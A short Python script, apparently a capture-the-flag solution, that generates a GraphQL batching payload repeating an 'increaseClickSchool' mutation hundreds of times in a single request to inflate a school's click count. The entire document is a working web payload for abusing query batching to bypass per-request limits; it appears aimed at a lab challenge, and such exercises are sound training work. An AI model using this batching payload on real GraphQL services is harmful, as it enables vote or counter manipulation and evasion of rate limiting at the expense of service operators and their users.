# click query
query = '''{"query":"mutation { increaseClickSchool(schoolName: \\"Flag CyberSecurity School\\"){schoolId, nbClick} }"}'''

# generate batch click query and write to payload.txt
final_query = "["
for i in range(1338 // 2): # 1338 at one go doesn't work :/
    final_query += query
    final_query += ","
final_query = final_query[:-1]
final_query += "]"

# f = open("payload.txt", "w")
# f.write(final_query)
print(final_query)
